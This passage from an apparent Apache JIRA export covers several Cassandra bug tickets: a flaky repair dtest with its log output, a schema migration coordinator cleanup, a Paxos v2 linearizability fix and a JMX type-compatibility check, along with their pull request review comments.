;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node1/conf'}
02:34:17 00:34:17,630 ccm INFO node1: current_java_version=8, current_java_home_version=8, jvm_version=None, for_build=False, cassandra_version=4.0.4, install_dir=/home/cassandra/cassandra, env={'PYTHONUNBUFFERED': 'true', 'CASS_DRIVER_NO_CYTHON': 'true', 'CCM_CONFIG_DIR': '/home/cassandra/cassandra/.ccm', 'HOSTNAME': 'b5a2d8d3c06d', 'JAVA_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'CASS_DRIVER_NO_EXTENSIONS': 'true', 'REPO': 'apache', 'NUM_TOKENS': '16', 'CCM_HEAP_NEWSIZE': '512M', 'CASSANDRA_SKIP_SYNC': 'true', 'ANT_HOME': '/usr/share/ant', 'JAVA8_HOME': '/usr/lib/jvm/java-8-openjdk-amd64', 'PWD': '/home/cassandra/cassandra/cassandra-dtest', 'DTEST_REPO': 'https://github.com/apache/cassandra-dtest.git', 'HOME': '/home/cassandra', 'LANG': 'en_US.UTF-8', 'LS_COLORS': 'rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:', 'VIRTUAL_ENV': '/home/cassandra/cassandra/venv', 'TMPDIR': './tmp', 'JAVA11_HOME': '/usr/lib/jvm/java-11-openjdk-amd64', 'CASSANDRA_DIR': '/home/cassandra/cassandra', 'WORKSPACE': '/home/cassandra/cassandra', 'LESSCLOSE': '/usr/bin/lesspipe %s %s', 'TERM': 'xterm', 'BRANCH': 'cassandra-4.0', 'LESSOPEN': '| /usr/bin/lesspipe %s', 'PYTHONIOENCODING': 'utf-8', 'SHLVL': '1', 'DTEST_BRANCH': 'trunk', 'LC_CTYPE': 'en_US.UTF-8', 'PS1': '(venv) ', 'CCM_MAX_HEAP_SIZE': '1024M', 'PATH': '/home/cassandra/cassandra/venv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'OLDPWD': '/home/cassandra/cassandra', '_': '/home/cassandra/cassandra/venv/bin/pytest', 'PYTEST_CURRENT_TEST': 'repair_tests/repair_test.py::TestRepair::()::test_dead_sync_initiator (call)', 'CASSANDRA_INCLUDE': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node1/bin/cassandra.in.sh', 'MAX_HEAP_SIZE': '1024M', 'HEAP_NEWSIZE': '512M', 'CASSANDRA_HOME': '/home/cassandra/cassandra', 'CASSANDRA_CONF': '/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c/test/node1/conf'}
02:34:17 00:34:17,631 ccm INFO node1: using Java 8 for the current invocation
02:34:17 00:34:17,631 ccm INFO node1: using Java 8 for the current invocation
02:34:17 00:34:20,32 cassandra.cluster INFO Host 127.0.0.3:9042 may be up; will prepare queries and open connection pool
02:34:20 00:34:23,376 dtest_setup DEBUG Errors were just seen in logs, ending test (if not ending already)!
02:34:23 Exception in thread Thread-18:
02:34:23 Traceback (most recent call last):
02:34:23   File ""/usr/lib/python3.8/threading.py"", line 932, in _bootstrap_inner
02:34:23     self.run()
02:34:23   File ""/home/cassandra/cassandra/venv/lib/python3.8/site-packages/ccmlib/cluster.py"", line 193, in run
02:34:23     self.scan_and_report()
02:34:23   File ""/home/cassandra/cassandra/venv/lib/python3.8/site-packages/ccmlib/cluster.py"", line 186, in scan_and_report
02:34:23     on_error_call(errordata)
02:34:23   File ""/home/cassandra/cassandra/cassandra-dtest/dtest_setup.py"", line 136, in _log_error_handler
02:34:23     pytest.fail(""Error details: \n{message}"".format(message=message))
02:34:23   File ""/home/cassandra/cassandra/venv/lib/python3.8/site-packages/_pytest/outcomes.py"", line 97, in fail
02:34:23     raise Failed(msg=msg, pytrace=pytrace)
02:34:23 Failed: Error details: 
02:34:23 Errors seen in logs for: node3
02:34:23 node3: ERROR [Stream-Deserializer-/127.0.0.1:7000-b30417f3] 2022-03-29 00:34:23,201 StreamSession.java:883 - [Stream #f9dc4400-aef7-11ec-8fb8-65ebe014c4f1] Remote peer /127.0.0.1:7000 failed stream session.
02:34:23 00:34:35,524 repair_tests.repair_test DEBUG Killed node2, now waiting repair to finish
02:34:35 PASSED
02:34:35 ------------------------------ live log teardown -------------------------------
02:34:35 00:34:35,532 conftest ERROR Unexpected error in node3 log, error: 
02:34:35 ERROR [Stream-Deserializer-/127.0.0.1:7000-b30417f3] 2022-03-29 00:34:23,201 StreamSession.java:883 - [Stream #f9dc4400-aef7-11ec-8fb8-65ebe014c4f1] Remote peer /127.0.0.1:7000 failed stream session.
02:34:35 00:34:36,38 dtest_setup DEBUG removing ccm cluster test at: /home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c
02:34:36 00:34:36,325 dtest_setup DEBUG clearing ssl stores from [/home/cassandra/cassandra/cassandra-dtest/tmp/dtest-xif8cz3c] directory
02:34:36 
02:34:36 repair_tests/repair_test.py::TestRepair::test_dead_sync_initiator ERROR
02:34:36 
02:34:36 ==================================== ERRORS ====================================
02:34:36 ___________ ERROR at teardown of TestRepair.test_dead_sync_initiator ___________
02:34:36 Unexpected error found in node logs (see stdout for full details). Errors: [ERROR [Stream-Deserializer-/127.0.0.1:7000-b30417f3] 2022-03-29 00:34:23,201 StreamSession.java:883 - [Stream #f9dc4400-aef7-11ec-8fb8-65ebe014c4f1] Remote peer /127.0.0.1:7000 failed stream session., ERROR [Stream-Deserializer-/127.0.0.1:7000-b30417f3] 2022-03-29 00:34:23,201 StreamSession.java:883 - [Stream #f9dc4400-aef7-11ec-8fb8-65ebe014c4f1] Remote peer /127.0.0.1:7000 failed stream session.]
{noformat}

h4. Empty ccm logs tar
In all of the above the {{ccm_logs.tar.xz}} tarball is empty. This is because the dtest flag {{--keep-failed-test-dir}} only keeps the ccm logs on failure tests, and the above are errors in the teardown stages.

",,dcapwell,maedhroz,mck,,,,,,,,,,,,"maedhroz opened a new pull request, #1570:
URL: https://github.com/apache/cassandra/pull/1570

   See https://github.com/apache/cassandra-dtest/pull/184


;14/Apr/22 16:23;githubbot;600","maedhroz closed pull request #1570: CASSANDRA-17541 Test Failure: repair_tests.repair_test.TestRepair.test_dead_sync_initiator
URL: https://github.com/apache/cassandra/pull/1570


;14/Apr/22 20:05;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1200,,,0,1200,,,,,,,,,,,,,,,CASSANDRA-17466,,,,,,CASSANDRA-17635,,,,,,CASSANDRA-17466,CASSANDRA-15963,,,,,,,,,,,,,,,,,,,0.0,maedhroz,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Apr 14 20:05:57 UTC 2022,,,,,,,All,,,,"0|z11b9s:",9223372036854775807,,,,dcapwell,,,,Low,,4.0,,https://github.com/apache/cassandra-dtest/commit/4ef129092609821b13eee36c285dbdd89aa05c61,,,,,,,,,n/a,,,,,"14/Apr/22 16:25;maedhroz;Here's a dtest patch, along with a branch that points to the new dtest branch for a CircleCI run...

[4.0 branch|https://github.com/apache/cassandra/pull/1570]
[dtest branch|https://github.com/apache/cassandra-dtest/pull/184]
[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17541-4.0&filter=all];;;","14/Apr/22 16:41;dcapwell;+1 patch matches the exception, and the exception is expected, just didn't have this log until now;;;","14/Apr/22 17:20;maedhroz;Just waiting for the J8 Circle run to complete without any problems...then will commit.;;;","14/Apr/22 17:35;mck;+1

Was it ever witnessed on circleci? 

Jenkins run is here: https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch-dtest/1325/ ;;;","14/Apr/22 17:44;brandon.williams;bq. Was it ever witnessed on circleci? 

https://app.circleci.com/pipelines/github/driftx/cassandra/434/workflows/77804032-ff82-4a01-9c6a-bfbbc4166f0b/jobs/5110/tests#failed-test-0;;;","14/Apr/22 20:05;maedhroz;Committed as https://github.com/apache/cassandra-dtest/commit/4ef129092609821b13eee36c285dbdd89aa05c61;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Clean up schema migration coordinator and tests,CASSANDRA-17533,13438269,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,jonmeredith,jonmeredith,jonmeredith,06/Apr/22 23:28,27/May/22 19:25,13/Jul/23 08:40,08/Apr/22 20:50,4.0.4,4.1,4.1-alpha1,,,,Cluster/Schema,,,,0,,"The schema migration coordinator was created to offload
the tracking and retrieval of schemas present across the
cluster when bootstrapping (CASSANDRA-15158).

The in-jvm dtests Instance startup was not correctly modified
to override the uptime calculation, and there are some
system properties that can be moved to CassandraRelevantProperties
so that they appear in the system virtual tables.",,dcapwell,jonmeredith,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,jonmeredith,,,,,,,,,,,,,,Code,,,,,,,,Low Hanging Fruit,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Fri Apr 08 16:37:26 UTC 2022,,,,,,,All,,,,"0|z118fk:",9223372036854775807,,,,dcapwell,,,,Low,,4.0.0,,https://github.com/apache/cassandra/commit/7ad0645f8c73acb2e949a174a3cc803dbd9919cf,,,,,,,,,Run existing tests. Locally (uncommitted) added a 60s sleep to the start of bootstrapTest to verify that the migration coordinator behaved as expected.,,,,,"07/Apr/22 17:59;jonmeredith;4.0 [PR|https://github.com/apache/cassandra/pull/1555] [Branch|https://github.com/jonmeredith/cassandra/tree/C175330-cleanup-migration-coord-4.0] [CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C175330-cleanup-migration-coord-4.0&filter=all]
trunk [PR|https://github.com/apache/cassandra/pull/1556] [Branch|https://github.com/jonmeredith/cassandra/tree/C175330-cleanup-migration-coord-trunk] [CircleCI|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=C175330-cleanup-migration-coord-trunk&filter=all]

Differences in the trunk PR are due to the simulator and pluggable schema changes.
I've checked with [~benedict] that the assertion in the simulator is appropriate.;;;","07/Apr/22 21:45;dcapwell;+1;;;","07/Apr/22 22:33;jonmeredith;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17533-cassandra-4.0-B5491044-E955-48E2-A9DF-A2F2D69F959F]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17533-cassandra-4.0-B5491044-E955-48E2-A9DF-A2F2D69F959F]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1576/]|;;;","07/Apr/22 23:26;jonmeredith;Second attempt, missed {{trunk}}.

Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17533-cassandra-4.0-02A5D866-E542-4BFC-A9BB-A19AE1755859]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17533-cassandra-4.0-02A5D866-E542-4BFC-A9BB-A19AE1755859]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1579/]|
|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17533-trunk-02A5D866-E542-4BFC-A9BB-A19AE1755859]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17533-trunk-02A5D866-E542-4BFC-A9BB-A19AE1755859]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1580/]|
;;;","08/Apr/22 16:37;jonmeredith;Third times the charm. upgrade in-JVM dtests failed as they don't have unit Assert available in the Instance class loader. Swapped for a regular assertion.

Starting commit

CI Results (pending):
||Branch||Source||Circle CI||Jenkins||
|cassandra-4.0|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17533-cassandra-4.0-DA17F719-F034-4D68-B1E6-CD2EBD68277E]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17533-cassandra-4.0-DA17F719-F034-4D68-B1E6-CD2EBD68277E]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1583/]|
|trunk|[branch|https://github.com/jonmeredith/cassandra/tree/commit_remote_branch/CASSANDRA-17533-trunk-DA17F719-F034-4D68-B1E6-CD2EBD68277E]|[build|https://app.circleci.com/pipelines/github/jonmeredith/cassandra?branch=commit_remote_branch%2FCASSANDRA-17533-trunk-DA17F719-F034-4D68-B1E6-CD2EBD68277E]|[build|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1584/]|
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Paxos v2 Linearizability Violation,CASSANDRA-17530,13438193,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,benedict,benedict,benedict,06/Apr/22 14:23,22/Nov/22 16:59,13/Jul/23 08:40,18/Oct/22 15:14,4.1,4.1-beta1,5.0,,,,Consistency/Coordination,,,,0,,"﻿The version of Paxos introduced recently had a subtle mistake that introduced a linearizability flaw that has been detected by the simulator, and also a flaw with the simulator has been found that may erroneously report a linearizability violation.

The true linearizability fault is quite simple: fast read permissions were erroneously being escalated to promises when an incomplete proposal was discovered. This was likely due in part to the naming of the state {{FOUND_INCOMPLETE_ACCEPTED}} which does not communicate that the ballot will be used to re-propose this proposal using the promises we have obtained. The fix is to yield {{SUPERSEDED}} if {{!haveOnlyPromises}}.

The false linearizability fault was triggered when two different competing incomplete proposals were reproposed multiple times, with the winning proposal being the one with the lower original ballot, and the proposal with the higher ballot having been successfully proposed to a majority of nodes but across multiple different ballots (so that no single ballot reached a majority), while the most recently successful ballot (at a minority) was the older original ballot. The range movement validation logic looked only at the original ballot, and since it saw the higher original ballot as having reached a majority perceived that it should have become persistent, when in fact the older ballot did so.",,bdeggleston,benedict,blerer,dcapwell,e.dimitrova,mck,,,,,,,,,"dcapwell commented on code in PR #1553:
URL: https://github.com/apache/cassandra/pull/1553#discussion_r908747986


##########
.circleci/config-2_1.yml:
##########
@@ -738,6 +745,15 @@ jobs:
       - log_environment
       - run_parallel_junit_tests
 
+  j8_simulator_dtests:
+    <<: *j8_small_par_executor
+    steps:
+      - attach_workspace:
+          at: /home/cassandra
+      - create_junit_containers

Review Comment:
   believe this should be
   
   ```
         - create_junit_containers:
             classlistprefix: simulator/test # see https://github.com/apache/cassandra/tree/trunk/test/simulator/test
   ```
   
   right now its mostly ignored, but its creating the split file based off unit tests... but then we ignore the split file and do our own thing...



##########
.circleci/config-2_1.yml:
##########
@@ -738,6 +745,15 @@ jobs:
       - log_environment
       - run_parallel_junit_tests
 
+  j8_simulator_dtests:
+    <<: *j8_small_par_executor

Review Comment:
   should use `j8_small_executor` else HIGH/MID will use concurrent workers



;28/Jun/22 17:29;githubbot;600","dcapwell commented on code in PR #1553:
URL: https://github.com/apache/cassandra/pull/1553#discussion_r908768952


##########
test/simulator/test/org/apache/cassandra/simulator/test/ShortPaxosSimulationTest.java:
##########
@@ -33,10 +33,12 @@ public void simulationTest() throws IOException
     {
         PaxosSimulationRunner.main(new String[] { ""run"", ""-n"", ""3..6"", ""-t"", ""1000"", ""-c"", ""2"", ""--cluster-action-limit"", ""2"", ""-s"", ""30"" });
     }
-
-    @Test
-    public void selfReconcileTest() throws IOException
-    {
-        PaxosSimulationRunner.main(new String[] { ""reconcile"", ""-n"", ""3..6"", ""-t"", ""1000"", ""-c"", ""2"", ""--cluster-action-limit"", ""2"", ""-s"", ""30"", ""--with-self"" });
-    }
+//
+// fails due to OOM DirectMemory - unclear why

Review Comment:
   nit: can do `@Ignore(""fails due to OOM DirectMemory - unclear why"")`



;28/Jun/22 18:12;githubbot;600","belliottsmith closed pull request #1553: CASSANDRA-17530 Paxos v2 Linearizability Violation
URL: https://github.com/apache/cassandra/pull/1553


;14/Jul/22 16:21;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,1800,,,0,1800,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,benedict,,,,,,,,,,,,,,Correctness -> Unrecoverable Corruption / Loss,,,,,,,,Normal,Fuzz Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Tue Nov 22 16:59:56 UTC 2022,,,,,,,All,,,,"0|z117yw:",9223372036854775807,,,,bdeggleston,dcapwell,,,Critical,,4.1-alpha1,,https://github.com/apache/cassandra/commit/067121da63c2a8ead48aeb9a4241af5306b14a37,,,,,,,,,simulator now included ind tests,,,,,"06/Apr/22 14:25;benedict;[PR|https://github.com/apache/cassandra/pull/1553];;;","19/Apr/22 18:09;bdeggleston;Looks good, +1;;;","21/Jun/22 01:32;e.dimitrova;Triaging the 4.1 blockers and stumbled into this one. It seems a bit old already. I believe it will need rebase and patches for both 4.1 and trunk plus CI runs. :) ;;;","28/Jun/22 18:13;dcapwell;finished my review, think the paxos/simulator changes LGTM, my only comments are related to the CircleCI configs.  If you switch the executor I am +1 (other comments are nits);;;","12/Jul/22 11:27;benedict;CircleCI: [java8
https://app.circleci.com/pipelines/github/belliottsmith/cassandra/307/workflows/4e71f806-e4eb-4869-aac1-d01d8a7a5bfe] [java11|https://app.circleci.com/pipelines/github/belliottsmith/cassandra/307/workflows/f3c2d1f4-f821-48dd-943c-1e6c6cb7df44]

One unrelated failure, merging.;;;","14/Jul/22 14:42;benedict;Caleb noted a dtest failure resulting from this ticket. I have opened a PR to address this, as it's a one line change, and fairly soon in follow-up: https://github.com/apache/cassandra/pull/1733

I've flagged Sam, David and Blake as potential reviewers, but if anyone has the time it should be very easy for anyone to +1.;;;","15/Jul/22 14:22;e.dimitrova;I think this was already committed? Probably just forgot to close the ticket?

I was about to review it but then I noticed the commit.

Side note: the CircleCI patch files need to be recreated to get rid of the offset warnings we currently see when we apply MIDRES or HIGHRES.

This can be done using the following script:

#. apply old patches (with hunk messages)
{code:java}
patch -o config-2_1.yml.MIDRES config-2_1.yml config-2_1.yml.mid_res.patch
patch -o config-2_1.yml.HIGHRES config-2_1.yml config-2_1.yml.high_res.patch{code}
#. generate new patches
{code:java}
diff -u config-2_1.yml config-2_1.yml.HIGHRES > config-2_1.yml.high_res.patch
diff -u config-2_1.yml config-2_1.yml.MIDRES > config-2_1.yml.mid_res.patch{code}
#. verify that the new patches generate the same files and cleanup
{code:java}
./generate.sh -a{code}
The last step should confirm for you only the patch files are new but the MIDRES and HIGHRES were not changed.
 
 ;;;","18/Oct/22 15:14;blerer;Committed into 4.1at 067121da63c2a8ead48aeb9a4241af5306b14a37 and merged into trunk;;;","22/Nov/22 15:16;mck;Was there a {{CHANGES.txt}} entry for this? (There are runtime classes touched here…);;;","22/Nov/22 15:35;benedict;I don't think the bug didn't make it into any release, so was there any change to note?;;;","22/Nov/22 16:02;mck;bq. I don't think the bug didn't make it into any release, so was there any change to note?

Was it not in {{4.1-alpha1}} ? (or have i misunderstood the since field?);;;","22/Nov/22 16:59;benedict;It wasn't when the patch was prepared, but it looks like it was merged shortly after alpha.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Clients using JMX are unable to handle non-standard java types but we leak this into our interfaces,CASSANDRA-17527,13438002,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,dcapwell,dcapwell,dcapwell,05/Apr/22 21:33,01/Nov/22 20:09,13/Jul/23 08:40,08/Apr/22 20:23,4.1,4.1-alpha1,,,,,Observability/JMX,,,,0,,"JMX clients only work if-and-only-if they have the same types defined by the interface, so non-standard java (or javax) types should never be used; we currently rely on humans to block this in review, which has lead to a few interfaces exposing Cassandra types",,dcapwell,e.dimitrova,,,,,,,,,,,,,"dcapwell commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r843322285


##########
src/java/org/apache/cassandra/db/DisallowedDirectories.java:
##########
@@ -49,14 +50,21 @@ private DisallowedDirectories()
         MBeanWrapper.instance.registerMBean(this, MBEAN_NAME, MBeanWrapper.OnException.LOG);
     }
 
-    public Set<File> getUnreadableDirectories()
+    @Override
+    public Set<java.io.File> getUnreadableDirectories()

Review Comment:
   cc @belliottsmith , had to revert the change done in Paxos as it breaks JMX.  I don't see anything using this methods so they are JMX only, so is there any issue with using java's file type?



;05/Apr/22 22:49;githubbot;600","adelapena commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r843758129


##########
test/unit/org/apache/cassandra/db/guardrails/GuardrailConsistencyLevelsTester.java:
##########
@@ -24,6 +24,7 @@
 import java.util.function.BiConsumer;
 import java.util.function.Function;
 import java.util.stream.Collectors;
+import java.util.stream.Stream;
 
 import com.google.common.collect.ImmutableSet;

Review Comment:
   Nit: the import of `ImmutableSet` is now unused



;06/Apr/22 10:12;githubbot;600","adelapena commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r843777579


##########
src/java/org/apache/cassandra/db/ColumnFamilyStoreMBean.java:
##########
@@ -53,6 +54,7 @@
     /**
      * force a major compaction of specified key range in this column family
      */
+    @BreaksJMX(""This API was released in 3.10 using a parameter that takes Range of Token, which can only be done IFF client has Cassandra binaries in the classpath"")

Review Comment:
   Shouldn't we provide a JMX-friendly variant of this method?



;06/Apr/22 10:29;githubbot;600","adelapena commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r843780086


##########
src/java/org/apache/cassandra/service/StorageServiceMBean.java:
##########
@@ -828,18 +829,22 @@ public StageConcurrency(int corePoolSize, int maximumPoolSize)
     /** Clears the history of clients that have connected in the past **/
     void clearConnectionHistory();
     public void disableAuditLog();
+    @BreaksJMX(""This API was exposed as throwing ConfigurationException, removing is binary compatible but not source; see https://docs.oracle.com/javase/specs/jls/se7/html/jls-13.html"")
     public void enableAuditLog(String loggerName, Map<String, String> parameters, String includedKeyspaces, String excludedKeyspaces, String includedCategories, String excludedCategories,
                                String includedUsers, String excludedUsers, Integer maxArchiveRetries, Boolean block, String rollCycle,
                                Long maxLogSize, Integer maxQueueWeight, String archiveCommand) throws ConfigurationException, IllegalStateException;
 
+    @BreaksJMX(""This API was exposed as throwing ConfigurationException, removing is binary compatible but not source; see https://docs.oracle.com/javase/specs/jls/se7/html/jls-13.html"")
     @Deprecated
     public void enableAuditLog(String loggerName, Map<String, String> parameters, String includedKeyspaces, String excludedKeyspaces, String includedCategories, String excludedCategories,
                                String includedUsers, String excludedUsers) throws ConfigurationException, IllegalStateException;
 
+    @BreaksJMX(""This API was exposed as throwing ConfigurationException, removing is binary compatible but not source; see https://docs.oracle.com/javase/specs/jls/se7/html/jls-13.html"")
     @Deprecated
     public void enableAuditLog(String loggerName, String includedKeyspaces, String excludedKeyspaces, String includedCategories, String excludedCategories,
                                String includedUsers, String excludedUsers) throws ConfigurationException, IllegalStateException;
 
+    @BreaksJMX(""This API was exposed as throwing ConfigurationException, removing is binary compatible but not source; see https://docs.oracle.com/javase/specs/jls/se7/html/jls-13.html"")

Review Comment:
   The two variants of `enableAuditLog` that are not marked as deprecated are new to 4.1, shouldn't we make them JMX-friendly instead of marking them with the new annotation?



;06/Apr/22 10:31;githubbot;600","adelapena commented on code in PR #1552:
URL: https://github.com/apache/cassandra/pull/1552#discussion_r843795185


##########
test/unit/org/apache/cassandra/tools/JMXStandardsTest.java:
##########
@@ -0,0 +1,180 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
